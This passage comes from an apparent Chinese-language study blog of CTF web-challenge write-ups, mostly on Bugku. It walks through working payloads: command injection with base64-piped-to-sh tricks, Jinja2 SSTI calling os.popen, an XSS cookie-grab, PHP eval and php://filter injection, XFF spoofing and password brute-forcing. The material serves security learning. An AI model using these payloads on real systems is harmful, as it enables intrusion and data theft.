class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>绕过<ul>
<li>简单变量替换，用$a覆盖拼接flag<ul>
<li>&#x2F;?ip&#x3D;;a&#x3D;g;cat$IFS$1$a</li>
</ul>
</li>
<li>变量ab互换传递，绕过字符串匹配，实现拼接<ul>
<li>?ip&#x3D;127.0.0.1;b&#x3D;ag;a&#x3D;fl;cat$IFS$1$a$b.php</li>
</ul>
</li>
<li>内联执行，<em>将反引号内的输出作为输入执行</em><ul>
<li>就有：cat$IFS$9`ls`</li>
</ul>
</li>
<li>Base64编码：<ul>
<li><code>cat flag.php</code> -&gt; Y2F0IGZsYWcucGhw</li>
<li>过滤了flag、bash，但sh没过滤，linux下可用sh<ul>
<li>?ip&#x3D;127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</li>
<li>|sh 就是执行前面的echo脚本</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Bugku"><a href="#Bugku" class="headerlink" title="Bugku"></a>Bugku</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://ctf.bugku.com/">Bugku CTF</a></p>
</blockquote>
<h3 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h3><h4 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h4><ul>
<li>题意：简单_模板注入</li>
<li>打开页面</li>
<li>意为需要传入一个名为flag的参数</li>
<li>尝试?flag&#x3D;flag<ul>
<li>网页输出为flag四个字母，尝试无果</li>
</ul>
</li>
<li>查看网页源代码<ul>
<li>发现注释：你知道，在flask中，我们经常会设置一个secret_key变量</li>
<li>注释中获得关键信息：flask，网页使用python作为后端语言，使用了flask作为web服务器框架，<a target="_blank" rel="noopener" href="https://www.cnblogs.com/mrchige/p/6387674.html">什么是Flask？</a></li>
<li>通过文章知道，flask依靠一个模板引擎：jinja2</li>
<li><a target="_blank" rel="noopener" href="https://www.shuzhiduo.com/A/RnJWQqXwdq/">jinja2主要语法</a></li>
<li>通过以上链接得知jinja2中变量使用双重花括号包裹</li>
</ul>
</li>
<li>题目评论区得知<ul>
<li>jinja2中secret_key在日志的配置文件中</li>
<li>通过访问日志</li>
<li>且可以通过config.SECRET_KEY获得</li>
<li>config.item()可以获取配置文件里的所有参数</li>
</ul>
</li>
<li>综上，我们构造<code>?flag=&#123;&#123;config.SECRET_KEY&#125;&#125;</code></li>
<li>获得flag</li>
</ul>
<h4 id="Simple-SSTI-2"><a href="#Simple-SSTI-2" class="headerlink" title="Simple_SSTI_2"></a>Simple_SSTI_2</h4><ul>
<li>照例，先构造<code>?flag=&#123;&#123;config.SECRET_KEY&#125;&#125;</code><ul>
<li>服务器返回None</li>
</ul>
</li>
<li>查看<code>?flag=&#123;&#123;config&#125;&#125;</code><ul>
<li>没有有用信息</li>
</ul>
</li>
<li>翻阅<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42557264/article/details/120326131?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-120326131-blog-123391624.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-120326131-blog-123391624.pc_relevant_aa&utm_relevant_index=1">博客</a>知道需要看一下内部文件<ul>
<li>如何看jinja2内部文件？<ul>
<li><code>http://114.67.175.224:12482/?flag=&#123;&#123;%20config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20../%27).read()%20&#125;&#125;</code><ul>
<li>参数中<ul>
<li><code>__class__</code>：用来查看变量所属的类，根据前面的变量形式可以<em>得到其所属的类</em></li>
<li><code>__init__</code> <em>初始化类</em>，返回的类型是function</li>
<li><code>__globals__[]</code> 使用方式: 函数名<code>.__globals__</code><em>获取function所处空间下可使用的module、方法以及所有变量</em>,此处<em>获取os的方法 popen()</em></li>
<li><code>os.popen()</code> 调用该方法用于从一个命令打开一个管道<ul>
<li>即可用于执行Linux&#x2F;cmd命令</li>
</ul>
</li>
<li><code>open()</code> 方法用于打开一个文件，并返回文件对象</li>
</ul>
</li>
<li>尝试不理会%20等编码直接输入参数<ul>
<li>失败</li>
<li>搜索得知JS会将特殊符号编码，而本例中，<code>os</code>左右应该有’’包裹，<code>ls</code>后应该有空格，查询得知<ul>
<li>%20 空格编码</li>
<li>%27 ‘’单引号编码</li>
</ul>
</li>
</ul>
</li>
<li>尝试带编码输入参数![[Pasted image 20221123173632.png]]</li>
</ul>
</li>
</ul>
</li>
<li>成功进入内部</li>
<li>查看第一个文件<ul>
<li><code>flag=&#123;&#123;%20config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20../app%27).read()%20&#125;&#125;)</code></li>
<li>页面回显:<code>Dockerfile app.py flag gunicorn.conf.py templates</code></li>
<li>找到flag，cat即可</li>
<li><code>?flag=&#123;&#123;%20config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20../app/flag%27).read()%20&#125;&#125;</code></li>
<li>页面回显:<code>flag&#123;80a7f935a18b2b8a089807746dea87b8&#125;</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h4><ul>
<li>进入题目直接给出了一个php函数，可以知道考察PHP的=&#x3D;与&#x3D;=&#x3D;的特性</li>
<li>弱相等&#x3D;&#x3D;<ul>
<li>对于用户传入的字符串，从第一位开始判断，若为数字，则可以当作数字使用，当碰到第一个非数字，则将该字符及其之后元素全部丢弃</li>
<li>对于一些普遍意义上相等的量，弱相等也返回true</li>
<li>例如：<ul>
<li>1=&#x3D;1 true</li>
<li>1 =&#x3D; 1abd32rwe true</li>
<li>1 &#x3D;&#x3D; afdshahf1 false</li>
<li>1 &#x3D;&#x3D; asdfhsahf false</li>
<li>123 =&#x3D; 123dfsj true</li>
<li>1 &#x3D;&#x3D; true true</li>
<li>若与数组比较，返回false</li>
</ul>
</li>
</ul>
</li>
<li>强相等=&#x3D;&#x3D;<ul>
<li>强相等严格比较传入数据</li>
<li>例如：<ul>
<li>1 &#x3D;&#x3D;&#x3D; 1abc false</li>
<li>1 &#x3D;&#x3D;&#x3D; true false</li>
<li>1&#x3D;&#x3D;&#x3D; 1 true</li>
</ul>
</li>
</ul>
</li>
<li>接下来看题目<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="variable">$GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">1</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#123;*******&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
<li>is_numeric()函数用于判断输入值是否为数字<ul>
<li>可以知道输入不能为数字，也就是需要输入字符串</li>
<li>当数字为1时，输出flag，这里使用了弱相等</li>
<li>构造”1xxxx”格式的字符串，获得flag</li>
</ul>
</li>
</ul>
<h4 id="Flask-FileUpload"><a href="#Flask-FileUpload" class="headerlink" title="Flask_FileUpload"></a>Flask_FileUpload</h4><ul>
<li>起初以为多难一道题，笑嘻了</li>
<li>flask提示网页使用python构建</li>
<li>查看源代码，翻译意为给我python文件，我给你结果</li>
<li>构造python文件<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os  </span><br><span class="line">os.system(<span class="string">&#x27;cat /flag&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li>提交发现提交不了，查看源代码发现只允许提交.jpg .png后缀文件<ul>
<li>可以更改html使得py可以提交（未尝试）</li>
<li>可以将py文件更改后缀为jpg</li>
<li>提交后f12中获取flag</li>
</ul>
</li>
</ul>
<h4 id="留言板"><a href="#留言板" class="headerlink" title="留言板"></a>留言板</h4><p>巨坑</p>
<hr>
<ul>
<li>题目提示是xss绕过，阅读源码发现是存储型xss</li>
<li>由于本人从未接触过该方面，上网搜索题解，发现需要使用到dirsearch工具<ul>
<li>安装<ul>
<li>github下载源码文件，开始安装依赖，巨坑开始</li>
<li>安装依赖总是报错</li>
<li>换清华源，报错，换各种源，报错</li>
<li>折腾一个小时后看到一篇博客，需要关闭代理，我nm代理开了一天</li>
<li>关闭代理，安装完美结束</li>
<li>手动微笑</li>
</ul>
</li>
</ul>
</li>
<li>开始扫描网址<code>python dirsearch.py -u http://114.67.175.224:12687/</code><ul>
<li>发现<code>/admin.php</code>为200状态码</li>
<li>理应有一个db.php，存放用户名和密码，但是出了问题，它消失了</li>
</ul>
</li>
<li>在db.php中，可以获得用户名和密码</li>
<li>通过用户名和密码，登录扫描出的admin.php<ul>
<li>登陆后可以看到我们输入在留言版中的消息</li>
<li>现在可以想到对留言板区域构造xss攻击</li>
</ul>
</li>
<li>进入留言板界面，在留言输入区域输入<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>获取cookie</li>
<li>此时切回管理员界面，刷新，flag就弹出来了，注意对 { 和 } 的编码进行转换</li>
</ul>
<h4 id="社工-初步收集"><a href="#社工-初步收集" class="headerlink" title="社工-初步收集"></a>社工-初步收集</h4><ul>
<li>由于闸总删了线索邮件导致题没法做，权且参考大佬<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46736332/article/details/116399471">思路</a></li>
<li>简要思路<ul>
<li>进入网站，查看源码，没有异常，开始扫描（御剑&#x2F;dirsearch）</li>
<li>发现&#x2F;admin&#x2F;login.php</li>
<li>点击初始界面几个连接发现一个软件压缩包</li>
<li>下载到本地随便输入内容，启动wireshark，选择WLAN，点击登录抓包</li>
<li>发现密码（base64编码）和邮箱，用户名等</li>
<li>尝试用户名密码登录失败</li>
<li>使用邮箱登录成功（在第三方软件使用上面解码后的密码作为授权码登录邮箱）</li>
<li>查看线索文件（已被删除）,上网搜索到相关资料<ul>
<li>发现生日为前两天,今天是2021年2月8日,回件人为mara，猜测密码，生成字典</li>
</ul>
</li>
<li>BP抓包，send to intrucder，载入字典开始爆破</li>
<li>用户名为mara，密码进行爆破，这里线索是生日，前两天,即20010206左右</li>
<li>登录成功，登入后台查看内容，获取flag</li>
</ul>
</li>
</ul>
<h4 id="game1"><a href="#game1" class="headerlink" title="game1"></a>game1</h4><ul>
<li>打开场景发现是个游戏，开始玩</li>
<li>F12观察，在游戏结束后网络中出现一个score.php包</li>
<li>双击打开，看wp发现要99999分才能获得flag</li>
<li>所以更改此包，怎么改？<ul>
<li>观察url，发现score中为我们刚才游戏获得的分数，后面的参数后跟三个等号，相似base64，高度怀疑是分数的base64编码，将分数用base64编码后是url中该字符串的一部分，遂按照这个base64字符串的格式，用99999的base64编码替换之前的得分base64，当然前面的分数也要替换</li>
<li>得到flag</li>
</ul>
</li>
</ul>
<h4 id="snowfall"><a href="#snowfall" class="headerlink" title="snowfall"></a>snowfall</h4><ul>
<li>不会，但是了解到了whitespace这种编程语言的使用</li>
</ul>
<h4 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h4><ul>
<li>提示说明了黑客可能留有后门，用dirsearch扫描发现<code>shell.php</code>，登录</li>
<li>需要输入密码，使用bp结合kali常用字典爆破，顺带一提，以后爆破还是用windows爆破把，下载个常用字典，也比kali安装破解版bp方便得多</li>
<li>当密码为hack时，发现payload返回长度不一致</li>
<li>输入hack，登录成功</li>
</ul>
<h4 id="本地管理员"><a href="#本地管理员" class="headerlink" title="本地管理员"></a>本地管理员</h4><ul>
<li>打开链接是一个登录页面</li>
<li>没有思路，F12查看源码，发现一串base64注释，解码后为<code>test123</code>，脑子一抽觉得test是用户名123是密码，我就给他们分。。开。。了。。</li>
<li>微笑</li>
<li>看wp发现，“本地”就可以猜测账号为admin，test123就是密码</li>
<li>输入，提示只允许本地登录，于是扩充知识点<ul>
<li>如何使服务器认为是本地登录？构造http头<strong>X-Forwarded-For</strong>（<strong>XFF</strong>）为127.0.0.1 ^3f997c<ul>
<li>用来识别通过<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/HTTP?fromModule=lemma_inlink">HTTP</a><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BB%A3%E7%90%86?fromModule=lemma_inlink">代理</a>或<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1?fromModule=lemma_inlink">负载均衡</a>方式连接到<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Web%E6%9C%8D%E5%8A%A1%E5%99%A8?fromModule=lemma_inlink">Web服务器</a>的客户端最原始的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80?fromModule=lemma_inlink">IP地址</a>的HTTP请求头字段</li>
</ul>
</li>
<li>如何构造http头？<ul>
<li>使用bp repeater模块截取网页包并重发</li>
<li>构造成功，点击send，在源码文件中获得flag</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="bp"><a href="#bp" class="headerlink" title="bp"></a>bp</h4><ul>
<li>题目很明显，使用bp</li>
<li>看题目描述，使用到了字典，所以要使用爆破，看wp了解到，描述中z？？？？？是提示题目采用top1000字典中z开头的数据</li>
<li>打开链接，用户名已经给出，只需要爆破密码</li>
<li>于是下载字典开始爆破<del>再次吐槽bp社区版的爆破速度</del></li>
<li>由于太慢，且发现所有返回包的长度都相同直接看答案了，密码为&#96;&#96;zxc123&#96;</li>
<li>输入密码，得到flag</li>
<li>那么，当爆破时密码返回长度都相同应该怎么办？<ul>
<li><p>首先开始爆破</p>
</li>
<li><p>查看爆破失败payload返回包，审计代码寻找相同字段，本题中为</p>
</li>
<li><p>打开bp<img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/CTF_Bugku_web_bp.webp" alt="Pasted image 20221126225416.png"></p>
</li>
<li><p>因此我们要对这个失败才有的r.code值进行过滤，怎么过滤？</p>
<ul>
<li><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/CTF_Bugku_web_bp2.webp" alt="Pasted image 20221126225848.png"></li>
</ul>
</li>
<li><p>过滤设置成功，重新开始爆破</p>
<ul>
<li>这次的关注点为{code:bugku100000}字段</li>
<li>爆破界面往右拉，发现只有payload为zxc123时，该字段没有显示值，其他payload该字段都显示1</li>
<li>断开bp尝试使用该payload登录</li>
<li>登录成功，得到flag</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><ul>
<li>打开连接，直接一个php函数： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> =<span class="variable">$_REQUEST</span>[<span class="string">&#x27;he11o&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(“<span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>):<span class="string">&quot;):</span></span><br><span class="line"><span class="string">show_source(__FILE__)</span></span><br></pre></td></tr></table></figure></li>
<li>解释php函数：<ul>
<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-includes.html">include和相似的require函数</a><ul>
<li>在 PHP 中，您可以在服务器执行 PHP 文件之前在该文件中插入一个文件的内容。</li>
<li>include 和 require 语句用于在执行流中<em>插入写在其他文件中的有用的代码</em>。</li>
<li>include 和 require 除了处理错误的方式不同之外，在其他方面都是相同的：<ul>
<li>require 生成一个致命错误（E_COMPILE_ERROR），在错误发生后脚本会停止执行。</li>
<li>include 生成一个警告（E_WARNING），在错误发生后脚本会继续执行。</li>
</ul>
</li>
</ul>
</li>
<li><strong>这里就是加载了flag.php文件</strong></li>
<li>预定义变量$_REQUEST<ul>
<li>用于获取from表单通过POST或者GET方式所提交的数据，也可以用于获取COOKIE信息；它是一个数组，包含了“$_GET”，“$_POST”   和“$_COOKIE”的所有信息。</li>
</ul>
</li>
<li><strong>这里即获取变量名为$hello的输入到变量$a</strong></li>
<li>把输入的内容当作php函数执行</li>
<li><strong>这里就是执行你输入的变量a的内容为函数</strong></li>
<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-var_dump-function.html">var_dump()函数</a>：<ul>
<li>输出变量相关信息</li>
</ul>
</li>
<li><strong>这里就是输出你的函数的相关信息</strong></li>
<li>最后一个看名字都知道要展示文件的源代码</li>
</ul>
</li>
<li>了解完PHP函数，看wp得知使用$GLOBALS变量为php文件中所有变量，我们利用vardump函数配合该变量输出本文件内所有的变量，如下图</li>
<li>于是我们构造<code>hello=$GLOBALS</code>发现类似flag东西</li>
<li>以为flag是它，输入发现错误，还被骂了一句，微笑</li>
<li>没招了，看看wp思路<ul>
<li>既然所有变量里都没有flag，我们可以猜测，flag在flag.php代码文件的注释里<ul>
<li>获取方式一<ul>
<li>构造<code>hello=);highlight_file(&#39;flag.php&#39;);var_dump(</code></li>
<li>为什么这么构造？<ul>
<li>针对题目函数,如果我们这样构造url参数，就有eval函数为</li>
<li><code>eval(&quot;var_dump();highlight_file(&#39;flag.php&#39;);vardump();&quot;);</code></li>
<li>highlight_file() 函数<ul>
<li>对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。</li>
</ul>
</li>
<li>这样我们就成功执行了语法高亮（包括注释），然后我们就能看到flag</li>
</ul>
</li>
</ul>
</li>
<li>获取方式二：<ul>
<li>构造&#96;hello&#x3D;file(“flag.php”)&#96;&#96;</li>
<li>这样我们就能使用vardump函数直接打印file.php源代码内容</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>注意点：<ul>
<li>php文件包含需要单双引号嵌套使用</li>
</ul>
</li>
</ul>
<h4 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h4><ul>
<li>打开题目环境，又是一个php函数<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span> (<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>“flag1.php<span class="string">&quot;</span></span><br><span class="line"><span class="string">highlight file(__file__)</span></span><br><span class="line"><span class="string">if(isset(<span class="subst">$_GET</span>[&#x27;args&#x27;]))&#123;</span></span><br><span class="line"><span class="string">    <span class="subst">$args</span> = <span class="subst">$_GET</span>[&#x27;args&#x27;];</span></span><br><span class="line"><span class="string">    if (!preg_match(&quot;</span>/^\w+$/<span class="string">&quot;,<span class="subst">$args</span>))&#123;</span></span><br><span class="line"><span class="string">          die(&quot;</span>args error!<span class="string">&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">    eval(&quot;</span><span class="title function_ invoke__">var_dump</span> (<span class="variable">$args</span>);):</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>第一行提示flag在变量里</li>
<li>函数功能参考题目eval思路</li>
<li>isset函数判断变量是否存在且非null</li>
<li>正则表达式，知识盲区</li>
<li>看到eval函数，里面的vardump函数使用的是两个美元符号的变量，这是什么？<ul>
<li>php中叫可变变量， 怎么理解？<ul>
<li>假定$a&#x3D;”hello”</li>
<li>再假定$$a&#x3D;”world”</li>
<li>此时，我们echo $hello就为world</li>
<li>也就是说，我们对变量的赋值成为了另外一个变量的名字</li>
<li>关于可变变量的更多知识，点击<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.variables.variable.php">这里</a></li>
</ul>
</li>
</ul>
</li>
<li>由此我们可以知道，本题中我们给变量的赋值又成为另外一个变量的变量名</li>
<li>厘清这层思路，我们构造全局变量globals大写，提交后发现提示错误，是正则表达式错误，看wp发现，变量前的美元符号正则已经给出，我们只需要构造字母即可.payload:<code>114.67.175.224:19361/?args=GLOBALS</code></li>
<li>得到flag</li>
</ul>
<h4 id="sorce"><a href="#sorce" class="headerlink" title="sorce"></a>sorce</h4><ul>
<li>打开题目提示使用linux，打开链接，注释里有个base64的假flag，解码发现不是flag</li>
<li>看网页内容，没有思路</li>
<li>既然提示Linux，我们打开kali，使用dirsearch扫描网页<ul>
<li>发现flag.php</li>
<li>打开，又被骗了</li>
<li>发现一系列git文件，这里就到了考点git泄露<ul>
<li>关于git泄露，点击[[0073 Git泄露相关知识(转载)|这里]]了解更多信息</li>
<li>既然发现网站后台把.git文件也上传上来了，我们就可以通过下载该目录文件获取更多信息<ul>
<li><code>wget -r xxxxx/.git</code>下载整个git目录</li>
</ul>
</li>
<li>打开，查看下载的内容，没有发现git目录，这是因为该目录已被隐藏，使用<code>ls -a</code> 查看，看到git目录</li>
<li>输入命令<code>git reflog</code> 查看文件更新日志<img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/CTF_Bugku_sorce.webp" alt="Pasted image 20221127190229.png"><ul>
<li>然后我们一个个文件查看，怎么查看？<ul>
<li><code>git show + 文件前面的哈希值</code></li>
<li>得到flag</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h4><ul>
<li>记一道没看wp的题，~~我们菜鸡是这样的捏 ~~</li>
<li>题目可以知道网页存在备份，进入kali，使用dirsearch扫描题目链接，也可使用御剑<ul>
<li>发现index.php.bak和flag.php(这个打开为空白)</li>
<li>打开题目链接，输入后缀.bak下载备份php文件</li>
<li>使用vscode打开备份文件<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strstr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>], <span class="string">&#x27;?&#x27;</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>.<span class="string">&quot;取得flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>审计代码<ul>
<li>第一行读入flag.php</li>
<li>第二行ini_set<ul>
<li>用来设置php.ini的值，在函数执行的时候生效，脚本结束后，设置失效。无需打开php.ini文件，就能修改配置，</li>
<li>@ini_set(‘error_reporting’,E_ALL); &#x2F;&#x2F;错误级别控制</li>
<li>@ini_set(‘display_errors’,1); &#x2F;&#x2F;是否显示错误</li>
<li>此处即为控制不显示错误</li>
</ul>
</li>
<li>第三行<ul>
<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-string-strstr.html">strstr()函数：</a>从第一个参数，即给定字符串里，找出第二个参数在该字符串中第一次出现的位置，并返回包括第二个参数在内的剩余字符串</li>
<li>$_SERVER[‘REQUEST_URI’]<ul>
<li>关于$_SERVER<ul>
<li>是 <a target="_blank" rel="noopener" href="http://c.biancheng.net/php/">PHP</a> 预定义变量之一，可以直接使用，它是一个包含了诸如头信息（header）、路径（path）及脚本位置（script locations）信息的<em>数组</em>。</li>
</ul>
</li>
<li>数组中的部分元素：<ul>
<li><p><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/CTF_Bugku_web_bakupIsGoodHabit" alt="Pasted image 20221127200556.png"></p>
</li>
<li><p>参考上表，我们可以知道<em>这里返回的就是带参数网址</em></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>第四行<ul>
<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-string-substr.html">substr()函数：</a>第一个参数即第三行处理好的问号以及参数们，第二个参数为要从第几个位置开始截取，这里为第一个位置，我们就可以<em>拿到去掉？之后的参数列表</em> ^substr</li>
</ul>
</li>
<li>第五行<ul>
<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-string-str-replace.html">str_replace()函数：</a>用于替换，从第一个参数中找到所有关键字符串，用第二个参数替换，这里的操作就是，把第一个字符串中的所有字符串”key”用空字符串””替换，也就是<em>实行了过滤</em></li>
</ul>
</li>
<li>第六行<ul>
<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-string-parse-str.html">parse_str() 函数：</a>把参数列表解析为$参数&#x3D;值的格式，使得php可以<em>把这些参数作为变量使用</em></li>
</ul>
</li>
<li>审计第七八行代码，容易知道我们要<em>构造变量$key1和 变量$key2</em>，同时，我们也<em>获取了它们的md5值</em></li>
<li>第九行判断，当<em>md5值相同但原始数据不同时，获得flag</em></li>
</ul>
</li>
<li>审计完毕，大致思路为，我们需要绕过对字符串key的过滤构造key1和key2变量，然后使这两个变量值的md5相同但原始数据不同</li>
<li>构造kekeyy1和kekeyy2，网上搜索符合if条件的Md5碰撞数据并填入</li>
<li>得到flag</li>
</ul>
<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><ul>
<li>通过题目就可以知道本题考察[[0074 文件包含|文件包含]]</li>
<li>打开题目链接，发现click me，点击试试</li>
<li>新页面显示<code>index.php</code>字符串,且url上出现?file&#x3D;show.php</li>
<li>?file&#x3D;XXX.php等是典型的文件包含</li>
<li>题目页面显示了index.php,首先在url后面改为?file&#x3D;index.php看看，发现连接被重置，不能进入这个页面</li>
<li>之后就想到文件包含可以使用[[0074 文件包含#PHP伪协议|php:&#x2F;&#x2F;filter]]</li>
<li>先在url后改为 ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;show.php</li>
<li>通过Base64解码后发现内容就是index.php,说明show.php没有隐藏信息</li>
<li>再在url后改为 ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</li>
<li>获得一串base64编码，解码后发现flag</li>
</ul>
<h4 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h4><ul>
<li>打开题目链接，发现是一大长串字符串，没有找到可用信息</li>
<li>观察url，发现：<code>http://114.67.175.224:17024/index.php?line=&amp;filename=a2V5cy5waHA=</code></li>
<li>line&#x3D;后面好像要跟一个数字，filename后面貌似是一个base编码值</li>
<li>对值进行翻译，是<code>keys.txt</code>合理猜测网页上的内容就是keys.txt的内容</li>
<li>那么网页的php源码应该也可以这样访问，我们构造base64编码的<code>index.php</code>作为filename的payload，访问，什么都没有，也没有思路</li>
<li>观察到line&#x3D;后面没有数字，跟一个1试试（filename依然是base64编码的index.php）<ul>
<li>出现<code>erroe_reporting(&quot;0&quot;)</code></li>
<li>貌似是源码第一行的文件</li>
<li>我们构造2</li>
<li>出现第二行php代码</li>
